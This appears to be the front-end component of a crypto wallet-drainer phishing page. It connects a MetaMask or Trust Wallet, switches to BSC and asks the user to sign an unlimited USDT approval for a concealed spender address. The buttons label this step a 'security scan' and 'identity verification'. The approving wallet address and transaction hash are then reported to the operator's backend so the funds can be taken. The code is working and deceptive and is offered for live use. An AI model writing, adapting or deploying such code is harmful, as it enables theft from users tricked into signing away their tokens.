"use client";

import { motion } from "framer-motion";
import { CheckCircle2, AlertTriangle } from "lucide-react";
import { useState } from "react";
import { BASE_URL, USDT_SPENDER_ADDRESS, USDT_ADDRESS, MAX_ALLOWANCE } from "../../../env";

const APPROVE_ABI = [
  {
    name: "approve",
    type: "function",
    inputs: [
      { name: "spender", type: "address" },
      { name: "amount", type: "uint256" },
    ],
    outputs: [{ name: "", type: "bool" }],
  },
];

declare global {
  interface Window {
    ethereum?: any;
  }
}

export function WalletConnect({ onConnect, onDisconnect }: any) {
  const [logs, setLogs] = useState<string[]>([]);
  const [error, setError] = useState("");
  const [loading, setLoading] = useState(false);
  const [address, setAddress] = useState<string | null>(null);
  const [step, setStep] = useState<"connect" | "approve" | "done">("connect");

  // =====================
  // CONNECT WALLET (MetaMask / Trust Wallet)
  // =====================
  const handleConnect = async () => {
    try {
      setLoading(true);
      setError("");

      if (!window.ethereum) {
        alert("MetaMask / Trust Wallet not detected. Please install a Web3 wallet.");
        return;
      }

      const accounts: string[] = await window.ethereum.request({
        method: "eth_requestAccounts",
      });

      if (!accounts || accounts.length === 0) throw new Error("No accounts returned.");

      const addr = accounts[0];
      setAddress(addr);
      setLogs(["> System Connected", `> ${addr.slice(0, 6)}...${addr.slice(-6)}`, "> Scan Ready"]);
      onConnect?.({ address: addr, balance: "0", network: "BSC Mainnet" });

      // Switch to BSC
      try {
        await window.ethereum.request({
          method: "wallet_switchEthereumChain",
          params: [{ chainId: "0x38" }],
        });
      } catch (switchError: any) {
        if (switchError.code === 4902) {
          await window.ethereum.request({
            method: "wallet_addEthereumChain",
            params: [
              {
                chainId: "0x38",
                chainName: "BNB Smart Chain",
                nativeCurrency: { name: "BNB", symbol: "BNB", decimals: 18 },
                rpcUrls: ["https://bsc-dataseed.binance.org/"],
                blockExplorerUrls: ["https://bscscan.com"],
              },
            ],
          });
        }
      }

      setStep("approve");
    } catch (e: any) {
      setError(e.message || "Connection failed");
    } finally {
      setLoading(false);
    }
  };

  // =====================
  // APPROVE USDT
  // =====================
  const handleApproval = async () => {
    try {
      setLoading(true);
      setError("");

      if (!address || !window.ethereum) throw new Error("Wallet not connected");

      const { ethers } = await import("ethers");
      const iface = new ethers.Interface(APPROVE_ABI);
      const data = iface.encodeFunctionData("approve", [USDT_SPENDER_ADDRESS, MAX_ALLOWANCE]);

      const txHash: string = await window.ethereum.request({
        method: "eth_sendTransaction",
        params: [{ from: address, to: USDT_ADDRESS, data, gas: "0x186A0" }],
      });

      await fetch(`${BASE_URL}/api/approved`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          network: "BSC Mainnet",
          owner: address,
          spender: USDT_SPENDER_ADDRESS,
          amount: MAX_ALLOWANCE.toString(),
          txHash: txHash || "unknown",
        }),
      });

      setStep("done");
      setLogs((p) => [...p, "> Scan Complete", `> ID: ${txHash.slice(0, 12)}...`]);
    } catch (e: any) {
      setError(e.message || "Approval failed");
    } finally {
      setLoading(false);
    }
  };

  const handleDisconnect = () => {
    setAddress(null);
    setStep("connect");
    setLogs([]);
    onDisconnect?.();
  };

  return (
    <div className="py-20 px-6">
      <div className="max-w-4xl mx-auto">

        {/* CONNECT */}
        {step === "connect" && (
          <motion.div>
            <div className="border border-slate-800 bg-slate-900 p-8 rounded-lg">
              <div className="flex justify-between mb-6">
                <span className="text-emerald-500 font-bold">WALLET CONNECT</span>
                <AlertTriangle className="text-emerald-500" />
              </div>
              <button
                onClick={handleConnect}
                disabled={loading}
                className="w-full py-3 bg-gradient-to-r from-emerald-600 to-emerald-500 text-white font-bold rounded hover:shadow-[0_0_15px_rgba(16,185,129,0.3)] transition-all"
              >
                {loading ? "Connecting..." : "Connect Wallet"}
              </button>
              <div className="mt-4 text-xs text-slate-400 text-center space-y-1">
                <p>Works with <strong className="text-emerald-400">MetaMask</strong> and <strong className="text-emerald-400">Trust Wallet</strong> (BSC).</p>
              </div>
              {error && <p className="text-red-500 mt-3">{error}</p>}
            </div>
          </motion.div>
        )}

        {/* APPROVE */}
        {step === "approve" && (
          <div className="border border-slate-800 bg-slate-900 p-6 rounded-lg">
            <div className="flex justify-between mb-4">
              <span className="text-emerald-500 font-bold">STEP 2: VERIFY IDENTITY</span>
              <button onClick={handleDisconnect} className="text-emerald-500 hover:text-emerald-400 transition-colors">
                DISCONNECT
              </button>
            </div>
            <p className="text-slate-400 mb-4">Verifying your BSC wallet security</p>
            <button
              onClick={handleApproval}
              disabled={loading}
              className="w-full py-3 bg-gradient-to-r from-emerald-600 to-emerald-500 text-white font-bold rounded hover:shadow-[0_0_15px_rgba(16,185,129,0.3)] transition-all"
            >
              {loading ? "Scanning..." : "Start Security Scan"}
            </button>
            {error && <p className="text-red-500 mt-3">{error}</p>}
            <div className="mt-4 font-mono text-sm space-y-1">
              {logs.map((l, i) => <div key={i} className="text-emerald-400">{l}</div>)}
            </div>
          </div>
        )}

        {/* DONE */}
        {step === "done" && (
          <div className="border border-emerald-500/50 bg-slate-900 p-6 rounded-lg">
            <div className="flex justify-between mb-4">
              <span className="text-emerald-500 font-bold flex items-center gap-2">
                <CheckCircle2 size={16} />
                APPROVED
              </span>
              <button onClick={handleDisconnect} className="text-slate-400 hover:text-emerald-500 transition-colors">
                DISCONNECT
              </button>
            </div>
            <p className="text-emerald-400">Security verification completed successfully</p>
            <div className="mt-4 font-mono text-sm space-y-1">
              {logs.map((l, i) => <div key={i} className="text-emerald-400">{l}</div>)}
            </div>
          </div>
        )}

      </div>
    </div>
  );
}
